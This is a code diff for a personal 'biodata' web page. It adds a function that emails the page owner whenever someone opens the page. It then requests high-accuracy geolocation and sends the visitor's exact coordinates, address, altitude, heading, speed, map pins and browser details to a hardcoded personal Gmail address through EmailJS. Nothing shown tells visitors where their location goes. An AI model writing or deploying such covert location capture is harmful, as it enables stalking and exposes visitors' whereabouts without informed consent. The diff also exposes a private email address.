@@ -36,61 +36,66 @@ const reverseGeocode = async (lat: number, lng: number): Promise<string> => {
   }
 };
 
-const getFirstPosition = (): Promise<GeolocationPosition | null> => {
-  return new Promise((resolve) => {
-    if (!("geolocation" in navigator)) return resolve(null);
-    let done = false;
-    const finish = (pos: GeolocationPosition | null) => {
-      if (done) return;
-      done = true;
-      resolve(pos);
-    };
-    navigator.geolocation.getCurrentPosition(
-      (pos) => finish(pos),
-      () => finish(null),
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-    setTimeout(() => finish(null), 10000);
+const sendPageOpenMail = async () => {
+  ensureInit();
+  await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
+    email: "shubhamsc9799@gmail.com",
+    subject: "📄 Biodata Page Opened",
+    message: "Someone just opened your biodata page.",
+    location: "Awaiting location permission...",
+    visitor_info: getVisitorInfo(),
+    timestamp: new Date().toLocaleString(),
   });
 };
 
-export const sendVisitWithLocationEmail = async () => {
+const sendLocationMail = async (pos: GeolocationPosition) => {
+  ensureInit();
+  const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
+  const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+  const address = await reverseGeocode(latitude, longitude);
+  const locationBlock =
+    `📍 Address: ${address}\n` +
+    `Latitude: ${latitude}\n` +
+    `Longitude: ${longitude}\n` +
+    `Accuracy: ~${Math.round(accuracy)} meters\n` +
+    (altitude != null ? `Altitude: ${altitude} m\n` : "") +
+    (heading != null ? `Heading: ${heading}\n` : "") +
+    (speed != null ? `Speed: ${speed} m/s\n` : "") +
+    `Google Maps: ${mapsUrl}\n` +
+    `Precise pin: ${preciseUrl}`;
+
+  await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
+    email: "shubhamsc9799@gmail.com",
+    subject: "📍 Visitor Exact Location Captured",
+    message: `Visitor allowed location access.\n\n${locationBlock}`,
+    location: locationBlock,
+    visitor_info: getVisitorInfo(),
+    timestamp: new Date().toLocaleString(),
+  });
+};
+
+export const notifyVisit = async () => {
+  // 1) Send page-open mail immediately
   try {
-    const pos = await getFirstPosition();
-    ensureInit();
-
-    let locationBlock = "Location: Denied or unavailable";
-    let subject = "📄 Biodata Page Opened (no location)";
-    let message = "Someone just opened your biodata page. Location was not shared.";
-
-    if (pos) {
-      const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
-      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-      const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-      const address = await reverseGeocode(latitude, longitude);
-      locationBlock =
-        `📍 Address: ${address}\n` +
-        `Latitude: ${latitude}\n` +
-        `Longitude: ${longitude}\n` +
-        `Accuracy: ~${Math.round(accuracy)} meters\n` +
-        (altitude != null ? `Altitude: ${altitude} m\n` : "") +
-        (heading != null ? `Heading: ${heading}\n` : "") +
-        (speed != null ? `Speed: ${speed} m/s\n` : "") +
-        `Google Maps: ${mapsUrl}\n` +
-        `Precise pin: ${preciseUrl}`;
-      subject = "📄 Biodata Page Opened (with location)";
-      message = `Someone just opened your biodata page.\n\n${locationBlock}`;
-    }
-
-    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
-      email: "shubhamsc9799@gmail.com",
-      subject,
-      message,
-      location: locationBlock,
-      visitor_info: getVisitorInfo(),
-      timestamp: new Date().toLocaleString(),
-    });
+    await sendPageOpenMail();
   } catch (e) {
-    console.error("Notify email failed:", e);
+    console.error("Page open mail failed:", e);
   }
+
+  // 2) Try to get location; if granted, send a second mail with exact location
+  if (!("geolocation" in navigator)) return;
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      try {
+        await sendLocationMail(pos);
+      } catch (e) {
+        console.error("Location mail failed:", e);
+      }
+    },
+    (err) => {
+      console.warn("Location denied/unavailable:", err.message);
+    },
+    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+  );
 };
